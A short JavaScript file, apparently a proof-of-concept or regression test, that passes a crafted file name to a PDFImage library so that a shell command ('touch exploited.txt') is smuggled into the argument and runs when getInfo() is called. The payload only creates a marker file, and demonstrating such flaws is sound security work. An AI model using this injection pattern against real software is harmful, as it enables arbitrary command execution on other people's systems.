'use strict'

const pkg = require('../src');
const i = new pkg.PDFImage('" | touch exploited.txt "', {});
i.getInfo();
